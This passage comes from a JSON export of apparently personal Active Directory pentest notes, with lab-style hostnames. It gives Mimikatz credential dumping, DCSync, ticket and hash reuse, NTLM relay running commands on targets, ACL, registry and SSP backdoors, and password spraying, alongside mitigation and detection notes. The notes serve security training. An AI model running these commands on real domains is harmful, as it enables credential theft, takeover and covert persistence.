    "frontmatter": {}
  },
  {
    "slug": "active_directory/general/installation",
    "path": "active_directory/general/installation.md",
    "title": "Installation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Installation Setup DNS `powershell Install normal DNS server Install-WindowsFeature DNS Register DNS records cmd /c ipconfig -registerdns ` Install AD DS on Server Core `powershell Install AD DS and m...",
    "category": "active_directory",
    "content": "# Installation\n\n## Setup DNS\n\n```powershell\n# Install normal DNS server\nInstall-WindowsFeature DNS\n\n# Register DNS records\ncmd /c ipconfig -registerdns\n```\n\n## Install AD DS on Server Core\n\n```powershell\n# Install AD DS and management tools\nInstall-WindowsFeature -Name ad-domain-services -IncludeManagementTools\n\n# Install new forest and domain\nInstall-ADDSForest -DomainName \"lab.local\"\n```\n\n## Add Domain Controller\n\n```powershell\n# Add domain controller and prompt for credentials\nInstall-ADDSDomainController -DomainName \"lab.local\" -Credential (Get-Credential Lab\\Administrator)\n```\n\n### Create DC from IFM Media\n\n```bat\n\" Create directory for image\nmkdir C:\\ifm\n\n\" Launch ntdsutil\nntdsutil\nntdsutil: activate instance ntds\nntdsutil: ifm\nifm: create sysvol full c:\\ifm\n```\n\nTransfer folder to target computer then run\n\n```powershell\nInstall-ADDSDomainController -DomainName \"lab.local\" -Credential (Get-Credential Lab\\Administrator) -InstallationMediaPath \"C:\\ifm\"\n```\n\n### Clone DC\n\n```powershell\n# Get list of applications that do not support cloning\nGet-ADDCCloningExcludedApplicationList\n\n# Create list of applications that do support cloning\nGet-ADDCCloningExcludedApplicationList -GenerateXml\n\n# Create config file\nNew-ADDCCloneConfigFile -Static -IPv4Address \"192.168.47.13\" -IPv4DNSResolver \"192.168.47.10\" -IPv4SubnetMask \"255.255.255.0\" -CloneComputerName \"DC04\" -IPv4DefaultGateway \"192.168.47.2\"\n\n# Shutdown computer and clone VM\nStop-Computer\n```\n\n## Join Computer To Domain\n\n```powershell\n# Add computer to domain and restart\nAdd-Computer -DomainName \"lab.local\" -Restart\n\n# Rename computer and add to domain\nAdd-Computer -DomainName \"lab.local\" -NewName \"test\" -Restart\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/general/kerberos",
    "path": "active_directory/general/kerberos.md",
    "title": "Kerberos",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Kerberos Introduction - Default authentication service for AD domains - Uses 3rd party ticket autorization as well as stronger encryption than NTLM --- Authentication Process 1. Client encrypts a time...",
    "category": "active_directory",
    "content": "# Kerberos\n\n## Introduction\n\n- Default authentication service for AD domains\n- Uses 3rd party ticket autorization as well as stronger encryption than NTLM\n\n---\n\n## Authentication Process\n\n1. Client encrypts a timestamp with his NTLM hash and sends it to the KDC (`AS-REQ`)\n2. KDC encrypts TGT with user NTLM, signs it and sends it back to the user (`AS-REP`). Only `krbtgt` can open and read TGT data\n3. Clients encrypts TGT with `krbtgt` NTLM hash when requesting a TGS ticket (`TGS-REQ`)\n4. KDC encrypts TGS with target service's NTLM hash and sends it back to the client (`TGS-REP`)\n5. User connects to the server hosting the service on the appropriate port & presents the TGS (`AP-REQ`)\n6. Service validates the ticket and checks weather the user can access it or not\n\n---\n\n## Terminology\n\n### Ticket Granting Ticket (TGT)\n\nAuthentication ticket used to request service tickets from the TGS for specific resources from the domain.\n\n### Key Distribution Center (KDC)\n\nA service issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.\n\n### Authentication Service (AS)\n\nIssues TGTs to be used by the TGS i nthe domain to request access to other machines and service tickets.\n\n### Ticket Granting Service (TGS)\n\nTakes the TGT and returns a ticket to a machine on the domain.\n\n### Service Principal Name (SPN)\n\nIdentifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.\n\n### KDC Long Term Secret Key (KDC LT Key)\n\nKDC key is based on the KRBTGT service account. Used to encrypt the TGT and sign the PAC.\n\n### Client Long Term Secret Key (Client LT Key)\n\nClient key is based on the computer or service account. It is used to check the encrypted timestampt and encrypt the session key.\n\n### Service Long Term Secret Key (Service LT Key)\n\nThe service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.\n\n### Session Key\n\nIssued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.\n\n### Privilege Attribute Certificate (PAC)\n\nThe PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.\n\n---\n\n## AS-REQ with Pre-Authentication\n\n- Starts when a user requests a TGT from the KDC\n- To validate the user and create a TGT for him, KDC must follow certain steps\n  - User encrypts a timestamp NT hash and send it to the AS\n  - KDC attempts to decrypt the timestampt using the user's NT hash\n  - If successful, KDC will issue TGT and session key for the user\n\n### Ticket Granting Ticket Contents\n\n- TGT is provided by the user to KDC\n- KDC validates ticket and returns service ticket\n- Content:\n  - Start/end/validity time\n  - Service name\n  - Target name\n  - Client name\n  - Session key\n  - PCA\n  - Signed with\n    - Service LT Key\n    - KDC LT Key\n\n### Service Ticket Contents\n\n- Contains two portions: service-provided portion & user-provided portion\n- Service portion\n  - User details\n  - Session key\n  - Encrypts the ticket with service account NTLM hash\n- User portion\n  - Validity timestamp\n  - Session key\n  - Encrypts with the TGT session key\n\n---\n\n## Kerberos Tickets Overview\n\n- TGT comes in various formats\n  - .kirbi for Rubeus\n  - .ccache for Impacket\n- Ticket is base64 encoded\n- Once user gives TGT to server, it then\n  - gets user details & session key\n  - encrypts ticket with service NTLM hash\n- KDC will authenticate TGT and return service ticket\n- Normal TGT will only work for the target service\n- KRBTGT allows you to get any service ticket to gain access to anything in the domain\n\n---\n\n## Attack Privilege Requirements\n\n| Attack |Requirements |\n| --- | --- |\n| Kerbrute Enumeration | No domain access required  |\n| Pass the Ticket | Access as a user to the domain required |\n| Kerberoasting | Access as any user required |\n| AS-REP Roasting | Access as any user required |\n| Golden Ticket | Full domain compromise (domain admin) required  |\n| Silver Ticket | Service hash required  |\n| Skeleton Key | Full domain compromise (domain admin) required |\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/general/kerberos_delegation",
    "path": "active_directory/general/kerberos_delegation.md",
    "title": "Kerberos_delegation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "kerberos_delegation What is Kerberos Delegation? - Allows to \"reuse the end-user credentials to access resources hosted on a different server\" - E.g. user authenticates to webserver, then webserver im...",
    "category": "active_directory",
    "content": "# kerberos_delegation\n\n## What is Kerberos Delegation?\n\n- Allows to \"reuse the end-user credentials to access resources hosted on a different server\"\n- E.g. user authenticates to webserver, then webserver impersonates user to authenticate to database server\n- But: Service account for web server must be trusted for delegation to impersonate user\n\n## Authentication Process\n\n- User provides credentials to DC\n- DC returns TGT\n- User requests TGS for web service on Web Server\n- Web server service account uses the user's TGT to request TGS for the database server from the DC\n- Web server service account connects to the database server as the user\n\n## Types of Kerberos Delegation\n\n### Unconstrained\n\n- General/basic delegation\n- Allows service to access any server on any computer in the domain\n\n### Constrained\n\n- Allows service to request access only to specified computers/resources\n- If user is not using Kerberos authentication to authenticate to web server, Windows offers Protocol Transition to transition the request to Kerberos\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/README",
    "path": "active_directory/lateral_movement/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Lateral Movement",
    "category": "active_directory",
    "content": "# Lateral Movement\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/credential_dumping",
    "path": "active_directory/lateral_movement/credential_dumping.md",
    "title": "Credential_dumping",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Credential Dumping Invoke-Mimikatz `powershell Dump on local machine Invoke-Mimikatz -DumpCreds Dump credentials on multiple remote machiens through PSRemoting cmdlet Invoke-Command Invoke-Mimikatz -D...",
    "category": "active_directory",
    "content": "# Credential Dumping\n\n## Invoke-Mimikatz\n\n```powershell\n# Dump on local machine\nInvoke-Mimikatz -DumpCreds\n\n# Dump credentials on multiple remote machiens through PSRemoting cmdlet Invoke-Command\nInvoke-Mimikatz -DumpCreds -ComputerName @(\"sys1\", \"sys2\")\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/dc_sync",
    "path": "active_directory/lateral_movement/dc_sync.md",
    "title": "Dc_sync",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "DC Sync Locally `powershell DCSync locally with mimikatz for specific user Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"' ` Remotely `powershell Get NTDS.dit via Impacket secretsdump ...",
    "category": "active_directory",
    "content": "# DC Sync\n\n## Locally\n\n```powershell\n# DCSync locally with mimikatz for specific user\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n```\n\n## Remotely\n\n```powershell\n# Get NTDS.dit via Impacket secretsdump remotely\nsecretsdump.py -dc-ip 10.10.149.145 spookysec.local/backup:backup2517860@10.10.149.145\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/overpass_the_hash",
    "path": "active_directory/lateral_movement/overpass_the_hash.md",
    "title": "Overpass_the_hash",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Overpass the Hash General - Similar to pass-the-hash - Creates valid kerberos ticket from NTLM hash of user - Able to access any domain service and not just services that support NTLM authentication l...",
    "category": "active_directory",
    "content": "# Overpass the Hash\n\n## General\n\n- Similar to pass-the-hash\n- Creates valid kerberos ticket from NTLM hash of user\n- Able to access any domain service and not just services that support NTLM authentication like in PTH attacks\n\n## Exploitation with Invoke-Mimikatz\n\n```powershell\nInvoke-Mimikatz -Command '\"sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<HASH> /run:powershell.exe\"'\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/pass_the_ticket",
    "path": "active_directory/lateral_movement/pass_the_ticket.md",
    "title": "Pass_the_ticket",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Pass the Ticket Overview - Use mimikatz to dump TGT from LSASS memory - Will give us .kirbi ticket which can be used to gain domain admin if ticket is from domain admin - Reuse old ticket to impersona...",
    "category": "active_directory",
    "content": "# Pass the Ticket\n\n## Overview\n\n- Use mimikatz to dump TGT from LSASS memory\n- Will give us .kirbi ticket which can be used to gain domain admin if ticket is from domain admin\n- Reuse old ticket to impersonate that ticket\n- Can also use base64-encoded tickets gathered with Rubeus\n- Look for Administrator tickets\n\n## Exploitation\n\n```powershell\n# Start mimikatz and get SYSTEM\nmimikatz.exe\nprivilege::debug\ntoken::elevate\n\n# Export all .kirbi tickets to current directory\nsekurlsa::tickets /export\n\n# PTT with mimikatz\nkerberos::ptt <ticket>\n\n# List cached tickets\nklist\n```\n\n## Mitigation:\n\n- Don't let domain admins log onto anything except the domain controller\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/ps_remoting",
    "path": "active_directory/lateral_movement/ps_remoting.md",
    "title": "Ps_remoting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "PowerShell Remoting General - psexec on steroids, enabled by default from Server 2012 - Might need to enable it on Desktop, admin privs required -> Enable-PSRemoting - Opens elevated shell on target i...",
    "category": "active_directory",
    "content": "# PowerShell Remoting\n\n## General\n\n- `psexec` on steroids, enabled by default from Server 2012\n- Might need to enable it on Desktop, admin privs required -> `Enable-PSRemoting`\n- Opens elevated shell on target if admin creds used\n- Two types:\n  - One-to-one\n  - One-to-many\n\n## One-to-One - PSSession\n\n- Interactive\n- Runs in new process (`wsmprovhost`)\n- Stateful\n\n```powershell\n# Enter interactive prompt on remote system for one-time use\nEnter-PSSession -ComputerName ws01.lab.local\n\n# Enter previously created session\n$Sess = New-PSSession -ComputerName ws01.lab.local\nEnter-PSSession -Session $Sess\n\n# With credentials\n# With GUI access\n$cred = Get-Credential\nEnter-PSSession -ComputerName ws01.lab.local -Credential $cred\n\n# Without GUI access\n$password = ConvertTo-SecureString \"MyPlainTextPassword\" -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential (\"username\", $password)\nEnter-PSSession -ComputerName ws01.lab.local -Credential $cred\n\n# Create persistent environment on remote system to be used in subsequest Invoke-Command calls or entered later with Enter-PSSession. Useful for scripts\nNew-PSSession -ComputerName ws01.lab.local\n```\n\n## One-to-Many - Fan-out Remoting\n\n- Non-interactive\n- Executes commands in parallel\n- Run commands and scripts on\n  - multiple remote computers\n  - in disconected sessions\n  - as background jobs\n- Good for pass-the-hash attacks and password spraying\n\n```powershell\n# Execute command or scriptblock\nInvoke-Command -Scriptblock {$ExecutionContext.SessionState.LanguageMode} -ComputerName (Get-Content hosts.txt)\n\n# Execute scripts from files\nInvoke-Command -FilePath C:\\scripts\\Get-PassHashes.ps1 -ComputerName (Get-Content hosts.txt)\n\n# Execute locally loaded function on remote machines\nInvoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content hosts.txt)\n\n# Pass arguments. Can only be used for positional arguments\nInvoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content hosts.txt) -ArgumentList\n\n# Execute \"stateful\" commands using Invoke-Command\n$Sess = New-PSSession -ComputerName ws01.lab.local\nInvoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}\nInvoke-Command -Session $Sess -ScriptBlock {$Proc.Name}\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/lateral_movement/ticket_harvesting",
    "path": "active_directory/lateral_movement/ticket_harvesting.md",
    "title": "Ticket_harvesting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Ticket Harvesting Harvesting Tickets `powershell Harvest for TGTs every 30 seconds Rubeus.exe harvest /interval:30 ` Brute-forcing / Password-spraying `powershell Rubeus.exe brute /password:Password1 ...",
    "category": "active_directory",
    "content": "# Ticket Harvesting\n\n## Harvesting Tickets\n\n```powershell\n# Harvest for TGTs every 30 seconds\nRubeus.exe harvest /interval:30\n```\n\n## Brute-forcing / Password-spraying\n\n```powershell\nRubeus.exe brute /password:Password1 /noticket\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/mitm_relay/README",
    "path": "active_directory/mitm_relay/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "MITM Relay",
    "category": "active_directory",
    "content": "# MITM Relay\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/mitm_relay/ipv6_attacks",
    "path": "active_directory/mitm_relay/ipv6_attacks.md",
    "title": "Ipv6_attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "IPv6 Attacks Overview - If both IPv4 and IPv6 are enabled and v4 is the main protocol, DNS for v6 is not configured - Attacker can impersonate IPv6 DNS server - Capture authentication requests to DC v...",
    "category": "active_directory",
    "content": "# IPv6 Attacks\n\n## Overview\n\n- If both IPv4 and IPv6 are enabled and v4 is the main protocol, DNS for v6 is not configured\n- Attacker can impersonate IPv6 DNS server\n- Capture authentication requests to DC via LDAP or SMB\n- LDAP relay via NTLM\n\n## Exploitation\n\n### Set Up mitm6\n\n```bash\ngit clone https://github.com/fox-it/mitm6 /opt/mitm6\ncd /opt/mitm6\npip3 install -r requirements.txt\npython3 setup.py install\n```\n\n### IPv6 DNS Takeover via mitm6\n\n```bash\n# Run mitm6\nmitm6 -d domain.local\n\n# Set up relay against DC\nntlmrelayx.py -6 -t ldaps://192.168.31.10 -wh fakepad.marvel.local -l lootme\n```\n\n## Mitigation\n\n- Block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy\n- Disable WPAD if it's not used via Group Policy\n- Enable LDAP signing and LDAP channel binding\n- Add Administrative users to the `Protected Users` group or marking them as sensitive and cannot be delegated to prevent impersonation of that user via delegation\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/mitm_relay/llmnr_poisoning",
    "path": "active_directory/mitm_relay/llmnr_poisoning.md",
    "title": "Llmnr_poisoning",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "LLMNR Poisoning What is LLMNR? - Used to identify hosts when DNS fails - Previously known as NBT-NS - Key flaw: services utilize a user's username and NTLMv2 hash when appropriately responded too Atta...",
    "category": "active_directory",
    "content": "# LLMNR Poisoning\n\n## What is LLMNR?\n\n- Used to identify hosts when DNS fails\n- Previously known as NBT-NS\n- Key flaw: services utilize a user's username and NTLMv2 hash when appropriately responded too\n\n## Attack Flow\n\n- Trick victim into connecting to malicious server under our control\n- Capture hash\n- Service name cannot be resolvable over DNS\n\n## Exploitation\n\n```bash\n# Run responder\npython responder.py -I tun0 -rdwv\n\n# Crack hash with hashcat\nhashcat -a 0 -m 5600 hashes.txt rockyou.txt\n```\n\n## Mitigation\n\n- Disable LLMNR and NBT-NS\n- If the functions can't be disabled, then\n  - require Network Access Control\n  - require strong password policy\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/mitm_relay/smb_relay",
    "path": "active_directory/mitm_relay/smb_relay.md",
    "title": "Smb_relay",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Smb Relay What is SMB Relay? - Capture hashes - Relay them to other hosts to authenticate - No need to crack hashes with hashcat Requirements - SMB signing must be disabled on the target - SMB signing...",
    "category": "active_directory",
    "content": "# Smb Relay\n\n## What is SMB Relay?\n\n- Capture hashes\n- Relay them to other hosts to authenticate\n- No need to crack hashes with hashcat\n\n## Requirements\n\n- SMB signing must be disabled on the target\n- SMB signing checks authenticity of SMB packets\n- Relayed user credentials must be admin on target machine\n\n## Exploitation\n\n```bash\n# Discover hosts with SMB signing disabled\npython RunFinger.py -i 10.0.0.2/24\nnmap --script=smb2-security-mode -p 445 -v 10.10.10.0/24\n\n# Turn off HTTP and SMB in Responder.conf\nnvim Responder.conf\n\n# Start responder\npython Responder.py -I tun0 -rdwv\n\n# Set up relay\n\n# Target specific host\npython MultiRelay.py -t 10.0.2.4 -u ALL\n\n# Target multiple hosts\n\n# Dump SAM hive\npython ntlmrelayx.py -tf targets.txt -smb2support\n\n# Interactive SMB shell\npython ntlmrelayx.py -tf targets.txt -smb2support -i\nnc 127.0.0.1 11000\n\n# Execute command\npython ntlmrelayx.py -tf targets.txt -smb2support -c \"whoami\"\n\n# Execute binary\npython ntlmrelayx.py -tf targets.txt -smb2support -e \"shell.exe\"\n```\n\n## Mitigation\n\n- Enable SMB signing on all devices (may cause performance issues with file copies)\n- Disable NTLM authentication on the network but Windows can default back to it if Kerberos stops working\n- Account tiering: limit domain admins to specific tasks\n- Local admin restriction (can increase service deskt tickets)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/README",
    "path": "active_directory/persistence/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Persistence",
    "category": "active_directory",
    "content": "# Persistence\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/acl_attacks",
    "path": "active_directory/persistence/acl_attacks.md",
    "title": "Acl_attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "ACL Attacks AdminSDHolder General - Resides in the System container of a domain - Used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups) - Se...",
    "category": "active_directory",
    "content": "# ACL Attacks\n\n## AdminSDHolder\n\n### General\n\n- Resides in the System container of a domain\n- Used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups)\n- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of `AdminSDHolder`\n- Any differences are overwritten on the object ACL\n- Protected groups\n  - Domain Admins\n  - Enterprise Admins\n  - Domain Controllers\n  - Read-only Domain Controllers\n  - Schema Admins\n  - Administrators\n  - Account Operators\n  - Backup Operators\n  - Server Operators\n  - Print Operators\n  - Replicator\n\n#### Protected Groups Abuse (All of the below Can Log on Locally to DC)\n\n| Group | Permissions |\n| --- | --- |\n| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups. |\n| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore |\n| Server Operators | Run a command as system (using the disabled Browser service) |\n| Print Operators | Copy `ntds.dit` backup, load device drivers |\n\n### Exploitation\n\n- With DA privileges (Full Control/Write permissions) on the `AdminSDHolder` object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the `AdminSDHolder` object\n- In 60 minutes (when `SDPROP` runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it\n\n```powershell\n# Add FullControl permission for a user to the AdminSDHolder using PowerView as DA\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student572 -Rights All -Verbose\n\n# Using AD Module and Set-ADACL\nSet-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -Verbose\n\n# Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student572 -Rights ResetPassword -Verbose\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student572 -Rights WriteMembers -Verbose\n\n# Run SDProp manually using Invoke-SDPropagator.ps1 to apply permissions immediately\nInvoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose\n\n# For Server 2008 and older\nInvoke-SDPropagator -taskName FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose\n\n# Check the Domain Admins permission as normal user\n# With PowerView\nGet-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{ $_.IdentityReference -match 'student572' }\n\n# Using AD Module\n(Get-Acl -Path 'AD:\\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{ $_.IdentityReference -match 'student572' }\n```\n\n#### Abusing FullControl Rights\n\n```powershell\n# Using PowerView_dev\nAdd-DomainGroupMember -Identity \"Domain Admins\" -Members testda -Verbose\n\n# Using AD Module\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members testda\n```\n\n#### Abusing ResetPassword Rights\n\n```powershell\n# Using PowerView_dev\nSet-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose\n\n# Using AD Module\nSet-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose\n```\n\n## Rights Abuse\n\n### General\n\n- Add useful rights to domain user\n- With DA privileges we can modify the ACL for the domain root to provide\n  - FullControl\n  - Ability to run DCSync\n\n### Exploitation\n\n#### FullControl Rights\n\n```powershell\n# Using PowerView\nAdd-Object -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights \"All\" -Verbose\n\n# Using AD Module\nSet-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -Verbose\n\n# Add new Domain Admin\n# Using PowerView_dev\nAdd-DomainGroupMember -Identity \"Domain Admins\" -Members testda -Verbose\n\n# Using AD Module\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members testda\n```\n\n#### DCSync Rights\n\n```powershell\n# Confirm if user already has DCSync rights with PowerView\nGet-ObjectAcl -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | ?{ ($_.IdentityReference -match \"student572\") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match \"GenericAll\")) }\n\n# Using PowerView\nAdd-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName \"student572\" -Rights \"DCSync\" -Verbose\n\n# Using AD Module\nSet-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight \"DCSync\" -Verbose\n\n# Execute DCSync to dump hash for krbtgt account\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n```\n\n#### ResetPassword Rights\n\n```powershell\n# Using PowerView\nAdd-ObjectAcl -TargetADSprefix 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights \"ResetPassword\" -Verbose\n\n# Using AD Module\nSet-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight \"ResetPassword\" -Verbose\n\n# Reset password for account\n# Using PowerView_dev\nSet-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose\n\n# Using AD Module\nSet-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose\n```\n\n#### WriteMembers Rights\n\n```powershell\n# Using PowerView\nAdd-ObjectAcl -TargetADSprefix 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights \"WriteMembers\" -Verbose\n\n# Using AD Module\nSet-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight \"WriteMembers\" -Verbose\n```\n\n## Security Descriptors\n\n### General\n\n- It's possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (secureable objects to allow access to non-admin users)\n- Admin privileges required\n- Security Description Definition Language defines format for Security Descriptors\n- SDDL uses ACE strings for DACL and SACL\n\n```powershell\nace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid\n```\n\n- ACE for built-in administrators for WMI namespaces\n\n```powershell\nA;CI;CCDCLCSWRPWPRCWD;;;SID\n```\n\n### Exploitation\n\nUsing samratashok's [RACE.ps1](https://github.com/samratashok/RACE)\n\n#### WMI\n\nModify ACLs to allow non-admin users access to securable objects\n\n```powershell\n# On local machine for user\nSet-RemoteWMI -SamAccountName student572 -Verbose\n\n# On remote machine for user without explicit credentials\nSet-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Namespace \"root\\cimv2\" -Verbose\n\n# On remote machine with explicit credentials. Only root\\cimv2 and nested namespaces\nSet-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Credential Administrator -Namespace \"root\\cimv2\" -Verbose\n\n# Remove permission on remote machine\nSet-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Namespace \"root\\cimv2\" -Remove -Verbose\n```\n\n#### PowerShell Remoting\n\nEnable PS Remoting\n\n```powershell\n# On local machine\nSet-RemotePSRemoting -SamAccountName student572 -Verbose\n\n# On remote machine without credentials\nSet-RemotePSRemoting -SamAccountName student572 -ComputerName dcorp-dc -Verbose\n\n# Remove permission on remote machine\nSet-RemotePSRemoting -SamAccountName student572 -ComputerName dcorp-dc -Remove -Verbose\n```\n\n#### Remote Registry\n\nRemote registry changes and backdoors\n\n```powershell\n# With admin privs on remote machine, create backdoor\nAdd-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student572 -Verbose\n\n# As student572, retrieve machine account hash\nGet-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose\n\n# Retrieve local account hash\nGet-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose\n\n# Retrieve domain cached credentials\nGet-RemoteCachedCredential -ComputerName dcorp-dc -Verbose\n```\n\n## Detection\n\n- Events (Audit Policy for object must be enabled)\n  - 4662: An operation was performed on an object\n  - 5136: A directory service object was modified\n  - 4670: Permissions on an object were changed\n- Useful tools:\n  - Bloodhound\n  - [AD ACL Scanner](https://github.com/canix1/ADACLScanner) - Create and compare reports of ACLs\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/custom_ssps",
    "path": "active_directory/persistence/custom_ssps.md",
    "title": "Custom_ssps",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Custom SSPs General - A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection - Some SSP packages by Microsoft are   - NTLM   - Kerberos...",
    "category": "active_directory",
    "content": "# Custom SSPs\n\n## General\n\n- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection\n- Some SSP packages by Microsoft are\n  - NTLM\n  - Kerberos\n  - Wdigest\n  - CredSSP\n- Mimikatz provdes custom SSP - mimilib.dll\n- This SSP logs local logons, service account and machine aacount passwords in clear text on the target server\n\n## Exploitation\n\n```powershell\n# First way: drop mimilib.dll to system32 and add mimilib to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\n$packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' | Select -ExpandProperty 'Security Packages'\n$packages += \"mimilib\"\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' -Value $packages\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name 'Security Packages' -Value $packages\n\n# Second way: using mimikatz to inject into lsass (unstable with Server 2016)\nInvoke-Mimikatz -Command '\"misc::memssp\"'\n\n# All logons on the DC are logged to C:\\Windows\\system32\\kiwissp.log\nGet-Content C:\\Windows\\system32\\kiwissp.log\n```\n\n## Detection\n\n- Event IDs:\n  - 4657: Audit creation/change of HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SecurityPackages\n  - 4624: Account Logon\n  - 4634: Account Logoff\n  - 4672: Admin Logon\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/dcshadow",
    "path": "active_directory/persistence/dcshadow.md",
    "title": "Dcshadow",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "DC Shadow General - Temporarily register a new domain controller in the target domain - Use it to \"push\" attributes like SIDHistory or SPN on the target object - Does not leave any change logs for the...",
    "category": "active_directory",
